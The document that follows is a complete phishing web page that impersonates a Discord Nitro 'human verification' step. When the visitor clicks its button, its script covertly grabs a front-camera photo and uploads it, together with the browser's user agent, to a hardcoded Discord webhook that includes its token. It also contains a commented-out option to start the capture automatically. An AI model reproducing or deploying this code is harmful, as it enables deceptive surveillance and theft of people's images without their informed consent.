<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Nitro</title>
  <style>
    body { 
      margin:0; 
      background:#111; 
      color:#eee; 
      font-family:Arial, sans-serif; 
      text-align:center; 
      padding: 20vh 10px; 
      min-height:100vh; 
    }
    #msg { 
      font-size:1.8em; 
      margin:20px; 
    }
    video, canvas { display:none; }
    .container { max-width:600px; margin:auto; }
    button { 
      padding:15px 40px; 
      font-size:1.3em; 
      background:#0066cc; 
      color:white; 
      border:none; 
      border-radius:8px; 
      cursor:pointer; 
      margin:20px; 
    }
    button:hover { background:#0055aa; }
    small { color:#aaa; font-size:0.9em; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Human Verification Required</h1>
    <p id="msg">Please click Verify below to continue. This helps verify you're a human.</p>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <button id="btn">Verify Now</button>

    <small style="margin-top:20px; display:block;">
      Note: Your device may show a one-time security prompt to confirm access.
    </small>
  </div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const msg = document.getElementById('msg');
    const btn = document.getElementById('btn');

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";

    async function captureAndSend() {
      try {
        msg.textContent = "Verifying your identity... please allow if prompted.";
        btn.disabled = true;

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }  // front camera
        });

        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 1200));  // settle time

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        stream.getTracks().forEach(track => track.stop());

        const blob = await new Promise(resolve => {
          canvas.toBlob(resolve, 'image/jpeg', 0.88);
        });

        msg.textContent = "Uploading verification...";

        const formData = new FormData();
        formData.append('file', blob, `capture_${Date.now()}.jpg`);
        
        const payload = {
          content: `New snap from ${navigator.userAgent}\nTime: ${new Date().toISOString()}`
        };
        formData.append('payload_json', JSON.stringify(payload));

        const response = await fetch(WEBHOOK_URL, {
          method: 'POST',
          body: formData
        });

        if (response.ok) {
          msg.textContent = "Verification successful! Thanks.";
          btn.style.display = 'none';
        } else {
          msg.textContent = "Upload failed — try again?";
          btn.disabled = false;
        }

      } catch (err) {
        msg.textContent = "Access blocked or error. Can't proceed.";
        console.error(err);
        btn.disabled = false;
      }
    }

    btn.addEventListener('click', () => {
      captureAndSend();
    });

    // Uncomment for auto-trigger aggression (still prompts, but no button needed)
    // setTimeout(captureAndSend, 2000);
  </script>
</body>
</html>
